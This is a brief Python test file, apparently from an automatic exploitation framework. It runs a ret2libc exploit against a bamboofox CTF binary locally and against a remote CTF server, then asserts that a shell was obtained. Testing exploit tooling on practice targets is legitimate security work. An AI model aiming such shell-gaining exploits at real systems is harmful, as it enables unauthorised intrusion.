from .. import *

BIN = "./tests/bamboofox/ret2libc"


def test_ret2libc_local(exploit):
    state = exploit(BIN, process(BIN))
    state = turnkey.classic(state)
    assert have_shell(state.target)


def test_ret2libc_remote(exploit):
    state = exploit(BIN, remote("bamboofox.cs.nctu.edu.tw", 11002))
    state = turnkey.classic(state)
    assert have_shell(state.target)
